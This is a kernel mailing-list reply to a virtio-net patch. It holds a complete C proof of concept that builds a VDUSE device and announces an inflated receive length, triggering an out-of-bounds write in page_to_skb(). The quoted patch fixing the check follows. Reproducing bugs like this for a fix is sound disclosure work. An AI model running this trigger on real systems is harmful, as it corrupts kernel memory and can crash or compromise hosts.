Received: from mail-pg1-f177.google.com (mail-pg1-f177.google.com [209.85.215.177])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 54333350A05
	for <virtualization@lists.linux.dev>; Wed, 10 Jun 2026 22:40:01 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.215.177
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1781131202; cv=pass; b=AljL9l2kMt4LmAt8g/L257MWGFG97iWAfeuLaTUoklEzEaJk+jUyCOBAxiwOx9NTjZXCfRmRehBhpGurD76E9srAY/EjKEMdbdX4vQMZqkrFn/hL6yFxB8ADwX3w1SloToTbHaYtC0Q519YEly/Gbl3SgcsMZaRrWFiWLW90+30=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1781131202; c=relaxed/simple;
	bh=NcHpuFFiYAEtcFM321ed9ZM0LP6xCAVoqIT9oNket8s=;
	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
	 To:Cc:Content-Type; b=K2OKJ5YfDQh8CTzN4FB9iXIxjEQcvx2L0YaVz+t61AYheReLHcDTfe2mkETuqRNdcQngU15AChAbNXbs76gjonbcZFTUsZrzMhbmZrfr5MOkrvsQ/crUuPBl1VwJBYmMgF0yh3Pcfym+2/TuuzeGoDCIVsvoXNbCa8TrRb1/krw=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu; spf=pass smtp.mailfrom=asu.edu; dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b=UA9wZJT/; arc=pass smtp.client-ip=209.85.215.177
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=asu.edu
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b="UA9wZJT/"
Received: by mail-pg1-f177.google.com with SMTP id 41be03b00d2f7-c8588ec1b44so5018229a12.1
        for <virtualization@lists.linux.dev>; Wed, 10 Jun 2026 15:40:01 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1781131201; cv=none;
        d=google.com; s=arc-20240605;
        b=QiVpD6zM+XjnzK/qDmNGnhgTxl7jN1wYMt38+Tz11LjkqtAfSVGHFnzYxP2Kuf8SDr
         2s+Hw5UO+Mfm+1vLklvaoOTEU1Po+zbVAMrKrFz5g/8AIlbBx1kE2ClAvYjHgAQd/B+h
         vsysvwKxxjxWiZzEzPy8p37zZ1MRUEuzNrDkt4U1bpfyF8GGbgyq+rymphv5jnOcXsez
         OFsUuGKFn5eS1jJ+xdv8g/TOXvdhIuqLHoHiI44q49gU6qtfsIyyQk9sxLyKjfosngVJ
         GOZwvAM8QJx3+aLgXv5ib5gL0CEsmO0GFHsq+swZ2qg8XGaoqYKiwtjopPPk7FHOl9ZG
         KjKw==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:dkim-signature;
        bh=ogMBwwg4KB39gKiZrceBt1KFvkbDaYAOVg41G6pkZLA=;
        fh=5oohr6Vw3Y6v7TvCn3IX/4TGE5x1nrlW1Gg+8QxMXdU=;
        b=YMaw8VJVINbMCN0DmmOrVjmD+s/nEjL6ba5jj21e1Iwj1jI0861i8Bs1Y/dDhpoOCk
         HN9KfWc6LsJMN3TjT+Z6Ykd5PpeMfrQVrWJOIwL/2QY9vEa7q52c1ZVfp0MV3v+Qwbdi
         +5952qG7M6j2juoOtFOoLpXuje4FD5XDZeU8M+w2DlRO95unDPKX4yPwGFaPfDkzSYMc
         zNE+j6BdCkDu1oJsJXPevsgwtg+FrFv51J93ANI7QXKSg8ttzsCR1dt9II0IvYuCzpW/
         muVsfYfJLtsdAb0CDNq8oQibTe9q71op4x4L8d1y1xv+pJ+IlFpeJnyUmJQVLdQ9J9qL
         97PQ==;
        darn=lists.linux.dev
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=asu.edu; s=google; t=1781131201; x=1781736001; darn=lists.linux.dev;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:from:to:cc:subject:date
         :message-id:reply-to;
        bh=ogMBwwg4KB39gKiZrceBt1KFvkbDaYAOVg41G6pkZLA=;
        b=UA9wZJT/BtGTELc0iRZYfcCj7W9eMULXoGTtXGWkb5vXxv3VgwXTQBfi9XD+nvtPwF
         1ohVuJJ1Fe8qxeSZ3Ken5CAlzZoEgV/XngS2R+w0xaDOu9gOJGtifV0ycfYzXEi2yktT
         +7Zb6KEudv2AaExDXCHUDhU4oRr+nj9JuoGNYERPVhVyh3d0OFk1GaNQw46nle6wgP3s
         RARFtchXegBmM1Ga9qdSZ+iImieshwO+/e56s9S5IuacUjoynf8IzXcqBq8EmmNKsGkA
         /iLl8b/qN5C/NGyoGdAQb3Kt+g3KAJfvGpbYAT8su8ItPCO+Dio7ScafJVVs9MzARb6Q
         e4lw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1781131201; x=1781736001;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:x-gm-gg:x-gm-message-state:from
         :to:cc:subject:date:message-id:reply-to;
        bh=ogMBwwg4KB39gKiZrceBt1KFvkbDaYAOVg41G6pkZLA=;
        b=nP/5kBqouGQ6MvlfLfdtsq+hfyUG6Qo1v5kuKvQqIuV69hXSB3g3ZuIxSs37mx8WhX
         enlgTyyLKduRNxK9hReVcJ+2sjJ0Au9nog+VdMRuXBo+sBohecGbwYKj0DQL0V8UHpwm
         +q4hJQscju76LPpJRGUmpq3BzXeNOt3vUMonU0+TdVmOQL2MfTHVyW+v37VJCaqfUmEf
         timnMDBTjJJ4KIqHOO8ZvdcjJ3euTVG5jx4zwjYZ0JtKSJBpk7/x0bxZn+ssgSxkxzEw
         hQi2735ri5eEaFtMUECIkccCx/Oausw5Gb6gGptiOH7IEe67fKAs8e5nmn++MUDmLnl7
         EC7g==
X-Forwarded-Encrypted: i=1; AFNElJ990X8sWGtmRRxOXCCj0LJhtDaKGRiGrFj9Dk1L7vNlsJEpht4S8qpSoD2dhwfkuzfUhguDqwSY0GUFaNYcCw==@lists.linux.dev
X-Gm-Message-State: AOJu0YxaKL7Hoq8vefKyJWLbIFpBx7GKlNW1uYk+UKfUCiIrvDLSM6gH
	7MWrp3LQyUowNe/d8J9rCc6NKswmG5HFR8m88X1A+K/XwK9nqI45cO1/ZMnuNkSxsD6ppZ1YmaW
	yt6CHoV6vIWEwpqrP9OE8o9yjo+yzKnW33PSyWbpZ
X-Gm-Gg: Acq92OGGU5n2wvzM/tO5WkffaneamDFvMrplJBAkiHltDiOLuc30krrI+Q2KtSlci5w
	sfPdQGxEFy2Fq3WOrdITlxxt+On05HA91r3VnNhGzNas23Bohx+ZvUHGJz/H4wVzQkZ83gdzlCO
	aY9nFCACWEr0knghGIJf2gT4Ttn3LHdKzT/YSKuwNqx/Sm8jKP0eE8D541gxa4wiICEc2eATGtK
	QbRfSjzetohrtUCQDhkLPdTZluoF+tFCLX6e8dRfbbaRx1z8a2aNuv28wA8R4YTGdIXTVdsjCU8
	hdldGU6Cs/tR6y6F5BYOrZedT1Q8LNFcB9omEB9FgMbx9XSwDoxy
X-Received: by 2002:a05:6a21:6816:b0:3b4:81b4:9b74 with SMTP id
 adf61e73a8af0-3b56dbedd41mr885460637.42.1781131200399; Wed, 10 Jun 2026
 15:40:00 -0700 (PDT)
Precedence: bulk
X-Mailing-List: virtualization@lists.linux.dev
List-Id: <virtualization.lists.linux.dev>
List-Subscribe: <mailto:virtualization+subscribe@lists.linux.dev>
List-Unsubscribe: <mailto:virtualization+unsubscribe@lists.linux.dev>
MIME-Version: 1.0
References: <20260610221606.1091465-1-xmei5@asu.edu>
In-Reply-To: <20260610221606.1091465-1-xmei5@asu.edu>
From: Xiang Mei <xmei5@asu.edu>
Date: Wed, 10 Jun 2026 15:39:49 -0700
X-Gm-Features: AVVi8Ce5ZuKu0cJn7v-PpLepAyWOJLsh2mmY_NxC73I5ur63g9vLmcBNSDVwNF4
Message-ID: <CAPpSM+Q2V6qXWHR9eWFoejD1DxmLVwh=LYV=3YvViRkz3EfNyg@mail.gmail.com>
Subject: Re: [PATCH net] virtio-net: fix len check in receive_big()
To: mst@redhat.com, jasowang@redhat.com, xuanzhuo@linux.alibaba.com, 
	eperezma@redhat.com
Cc: andrew+netdev@lunn.ch, davem@davemloft.net, edumazet@google.com, 
	kuba@kernel.org, pabeni@redhat.com, netdev@vger.kernel.org, 
	virtualization@lists.linux.dev, linux-kernel@vger.kernel.org, 
	minhquangbui99@gmail.com, bestswngs@gmail.com
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

Thanks for your attention to this bug. We'll provide some tips for
reproduction here
1) CONFIGs
```
CONFIG_VDPA=3Dy
CONFIG_VDPA_USER=3Dy
CONFIG_VIRTIO_VDPA=3Dy
CONFIG_VHOST_VDPA=3Dy
CONFIG_IKHEADERS=3Dn
CONFIG_DEBUG_INFO_BTF=3Dn
```

2) PoC
```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <poll.h>
#include <stdint.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <net/if.h>
#include <linux/sockios.h>
#include <linux/netlink.h>
#include <linux/genetlink.h>
#include <linux/vduse.h>
#include <linux/vdpa.h>
#include <linux/virtio_ids.h>
#include <linux/virtio_config.h>
#include <linux/virtio_net.h>
#include <linux/virtio_ring.h>

#define DEV_NAME "vdusebug"
#define BIT(x) (1ULL << (x))
#define FEATURES (BIT(VIRTIO_F_VERSION_1) | BIT(VIRTIO_F_ACCESS_PLATFORM) |=
 \
BIT(VIRTIO_NET_F_MAC) | BIT(VIRTIO_NET_F_GUEST_TSO4))
#define VQ_NUM 2
#define VQ_SIZE 256
#define die(s) do { perror(s); exit(1); } while (0)

/* ---- minimal generic-netlink: resolve vdpa family, then
VDPA_CMD_DEV_NEW ---- */

struct nlmsg {
struct nlmsghdr nh;
struct genlmsghdr gh;
char buf[1024];
};

static void nla_put(struct nlmsg *m, int type, const void *data, int len)
{
struct nlattr *a =3D (void *)((char *)m + NLMSG_ALIGN(m->nh.nlmsg_len));
a->nla_type =3D type;
a->nla_len =3D NLA_HDRLEN + len;
memcpy((char *)a + NLA_HDRLEN, data, len);
m->nh.nlmsg_len =3D NLMSG_ALIGN(m->nh.nlmsg_len) + NLA_ALIGN(NLA_HDRLEN + l=
en);
}

static int nl_send(int sk, struct nlmsg *m, char *rsp, int rsplen)
{
struct sockaddr_nl sa =3D { .nl_family =3D AF_NETLINK };
struct iovec iov =3D { .iov_base =3D m, .iov_len =3D m->nh.nlmsg_len };
struct msghdr mh =3D { .msg_name =3D &sa, .msg_namelen =3D sizeof(sa),
.msg_iov =3D &iov, .msg_iovlen =3D 1 };
if (sendmsg(sk, &mh, 0) < 0)
return -1;
return recv(sk, rsp, rsplen, 0);
}

static int vdpa_setup(int sk)
{
struct nlmsg m =3D {0};
char rsp[4096];
int n, famid =3D -1;

/* resolve VDPA genl family id */
m.nh.nlmsg_len =3D NLMSG_LENGTH(sizeof(m.gh));
m.nh.nlmsg_type =3D GENL_ID_CTRL;
m.nh.nlmsg_flags =3D NLM_F_REQUEST;
m.gh.cmd =3D CTRL_CMD_GETFAMILY;
m.gh.version =3D 1;
nla_put(&m, CTRL_ATTR_FAMILY_NAME, VDPA_GENL_NAME, strlen(VDPA_GENL_NAME) +=
 1);
n =3D nl_send(sk, &m, rsp, sizeof(rsp));
for (struct nlmsghdr *nh =3D (void *)rsp; NLMSG_OK(nh, n); nh =3D
NLMSG_NEXT(nh, n)) {
struct nlattr *a =3D (void *)((char *)NLMSG_DATA(nh) +
NLMSG_ALIGN(sizeof(struct genlmsghdr)));
int rem =3D NLMSG_PAYLOAD(nh, sizeof(struct genlmsghdr));
while (rem >=3D (int)NLA_HDRLEN && a->nla_len >=3D NLA_HDRLEN && rem >=3D
a->nla_len) {
if (a->nla_type =3D=3D CTRL_ATTR_FAMILY_ID)
famid =3D *(uint16_t *)((char *)a + NLA_HDRLEN);
rem -=3D NLA_ALIGN(a->nla_len);
a =3D (void *)((char *)a + NLA_ALIGN(a->nla_len));
}
}
if (famid < 0)
return -1;

/* VDPA_CMD_DEV_NEW name=3DDEV_NAME mgmtdev=3Dvduse */
memset(&m, 0, sizeof(m));
m.nh.nlmsg_len =3D NLMSG_LENGTH(sizeof(m.gh));
m.nh.nlmsg_type =3D famid;
m.nh.nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK;
m.gh.cmd =3D VDPA_CMD_DEV_NEW;
m.gh.version =3D 1;
nla_put(&m, VDPA_ATTR_DEV_NAME, DEV_NAME, strlen(DEV_NAME) + 1);
nla_put(&m, VDPA_ATTR_MGMTDEV_DEV_NAME, "vduse", 6);
return nl_send(sk, &m, rsp, sizeof(rsp)) > 0 ? 0 : -1;
}

/* ---- VDUSE control message worker + IOTLB mapping ---- */

static volatile int g_driver_ok, g_running =3D 1;

static void *vduse_worker(void *arg)
{
int fd =3D (intptr_t)arg;
struct pollfd pfd =3D { .fd =3D fd, .events =3D POLLIN };
while (g_running) {
if (poll(&pfd, 1, 100) <=3D 0)
continue;
struct vduse_dev_request req =3D {0};
struct vduse_dev_response resp =3D {0};
if (read(fd, &req, sizeof(req)) < 0)
continue;
resp.request_id =3D req.request_id;
resp.result =3D VDUSE_REQ_RESULT_OK;
if (req.type =3D=3D VDUSE_GET_VQ_STATE)
resp.vq_state.index =3D req.vq_state.index;
else if (req.type =3D=3D VDUSE_SET_STATUS && (req.s.status &
VIRTIO_CONFIG_S_DRIVER_OK))
g_driver_ok =3D 1;
write(fd, &resp, sizeof(resp));
}
return NULL;
}

/* map one IOVA page into our address space, returning the VA for `iova` */
static void *iova_map(int fd, uint64_t iova, int prot)
{
struct vduse_iotlb_entry e =3D { .start =3D iova, .last =3D iova };
int mfd =3D ioctl(fd, VDUSE_IOTLB_GET_FD, &e);
if (mfd < 0)
return NULL;
void *p =3D mmap(0, e.last - e.start + 1, prot, MAP_SHARED, mfd, e.offset);
close(mfd);
if (p =3D=3D MAP_FAILED)
return NULL;
return (char *)p + (iova - e.start);
}

/* ---- trigger ---- */

static void trigger(int fd)
{
struct vduse_vq_info info =3D { .index =3D 0 };
if (ioctl(fd, VDUSE_VQ_GET_INFO, &info) < 0 || !info.ready)
return;
uint32_t num =3D info.num;

struct vring_desc *desc =3D iova_map(fd, info.desc_addr, PROT_READ);
struct vring_avail *avail =3D iova_map(fd, info.driver_addr, PROT_READ);
struct vring_used *used =3D iova_map(fd, info.device_addr, PROT_READ |
PROT_WRITE);
if (!desc || !avail || !used || used->idx =3D=3D avail->idx)
return;

/* the driver posted an RX chain; just hand it back an inflated len.
* 73708 is what add_recvbuf_big() advertised; 73728 =3D (17+1)*4096
* passes the loose check and overruns page_to_skb()'s frag loop. */
uint16_t head =3D avail->ring[used->idx % num];
used->ring[used->idx % num] =3D (struct vring_used_elem){ .id =3D head,
.len =3D (17 + 1) * 4096 };
__sync_synchronize();
used->idx++;
__sync_synchronize();

uint32_t qidx =3D 0;
ioctl(fd, VDUSE_VQ_INJECT_IRQ, &qidx);
}

/* bring up every virtio_net iface (the VDUSE one) so the driver fills RX *=
/
static void ifaces_up(void)
{
int s =3D socket(AF_INET, SOCK_DGRAM, 0);
for (int i =3D 1; i < 16; i++) {
struct ifreq r =3D {0};
snprintf(r.ifr_name, IFNAMSIZ, "eth%d", i);
if (ioctl(s, SIOCGIFFLAGS, &r) < 0)
continue;
r.ifr_flags |=3D IFF_UP | IFF_RUNNING;
ioctl(s, SIOCSIFFLAGS, &r);
}
close(s);
}

int main(void)
{
pthread_t th;

int ctrl =3D open("/dev/vduse/control", O_RDWR);
if (ctrl < 0)
die("/dev/vduse/control");
uint64_t apiv =3D 0;
ioctl(ctrl, VDUSE_SET_API_VERSION, &apiv);

struct {
struct vduse_dev_config cfg;
struct virtio_net_config net;
} c =3D {0};
uint8_t mac[6] =3D { 0x52, 0x54, 0, 0x12, 0x34, 0x56 };
memcpy(c.net.mac, mac, 6);
strncpy(c.cfg.name, DEV_NAME, VDUSE_NAME_MAX - 1);
c.cfg.device_id =3D VIRTIO_ID_NET;
c.cfg.features =3D FEATURES;
c.cfg.vq_num =3D VQ_NUM;
c.cfg.vq_align =3D 4096;
c.cfg.config_size =3D sizeof(struct virtio_net_config);
if (ioctl(ctrl, VDUSE_CREATE_DEV, &c) < 0)
die("VDUSE_CREATE_DEV");

int fd =3D open("/dev/vduse/" DEV_NAME, O_RDWR | O_NONBLOCK);
if (fd < 0)
die("open vduse dev");
for (uint32_t i =3D 0; i < VQ_NUM; i++) {
struct vduse_vq_config vc =3D { .index =3D i, .max_size =3D VQ_SIZE };
ioctl(fd, VDUSE_VQ_SETUP, &vc);
}

/* worker must run before we attach: the bus probe blocks on its replies */
pthread_create(&th, NULL, vduse_worker, (void *)(intptr_t)fd);

int sk =3D socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
struct sockaddr_nl sa =3D { .nl_family =3D AF_NETLINK };
bind(sk, (void *)&sa, sizeof(sa));
if (vdpa_setup(sk) < 0)
die("vdpa setup");

for (int i =3D 0; i < 50 && !g_driver_ok; i++)
usleep(100000);
ifaces_up();
for (int i =3D 0; i < 30; i++)
usleep(100000);

for (int i =3D 0; i < 10; i++) {
trigger(fd);
usleep(200000);
}

g_running =3D 0;
pthread_join(th, NULL);
sleep(2);
return 0;
}
```

Let me know if you need more information.

Thanks,
Xiang

On Wed, Jun 10, 2026 at 3:16=E2=80=AFPM Xiang Mei <xmei5@asu.edu> wrote:
>
> receive_big() bounds the device-announced length by
> (big_packets_num_skbfrags + 1) * PAGE_SIZE.  That is still too loose:
> add_recvbuf_big() sets sg[1] to start at offset
> sizeof(struct padded_vnet_hdr) into the first page, so the chain
> actually carries hdr_len + (PAGE_SIZE - sizeof(padded_vnet_hdr)) +
> big_packets_num_skbfrags * PAGE_SIZE bytes -- 20 bytes less than the
> check allows for the common hdr_len =3D=3D 12 case.
>
> A malicious virtio backend can announce a len in that gap.  page_to_skb()
> then walks one frag past the page chain, storing a NULL page->private
> into skb_shinfo()->frags[MAX_SKB_FRAGS], which is both an out-of-bounds
> write past the static frag array and a NULL frag handed up the rx path.
>
> Bound len by the size add_recvbuf_big() actually advertised.
>
> Fixes: 0c716703965f ("virtio-net: fix received length check in big packet=
s")
> Reported-by: Weiming Shi <bestswngs@gmail.com>
> Signed-off-by: Xiang Mei <xmei5@asu.edu>
> ---
>  drivers/net/virtio_net.c | 8 +++++---
>  1 file changed, 5 insertions(+), 3 deletions(-)
>
> diff --git a/drivers/net/virtio_net.c b/drivers/net/virtio_net.c
> index f4adcfee7a80..afe73eda1491 100644
> --- a/drivers/net/virtio_net.c
> +++ b/drivers/net/virtio_net.c
> @@ -1999,15 +1999,17 @@ static struct sk_buff *receive_big(struct net_dev=
ice *dev,
>                                    struct virtnet_rq_stats *stats)
>  {
>         struct page *page =3D buf;
> +       unsigned long max_len;
>         struct sk_buff *skb;
>
>         /* Make sure that len does not exceed the size allocated in
>          * add_recvbuf_big.
>          */
> -       if (unlikely(len > (vi->big_packets_num_skbfrags + 1) * PAGE_SIZE=
)) {
> +       max_len =3D vi->hdr_len + (PAGE_SIZE - sizeof(struct padded_vnet_=
hdr)) +
> +                 vi->big_packets_num_skbfrags * PAGE_SIZE;
> +       if (unlikely(len > max_len)) {
>                 pr_debug("%s: rx error: len %u exceeds allocated size %lu=
\n",
> -                        dev->name, len,
> -                        (vi->big_packets_num_skbfrags + 1) * PAGE_SIZE);
> +                        dev->name, len, max_len);
>                 goto err;
>         }
>
> --
> 2.43.0
>
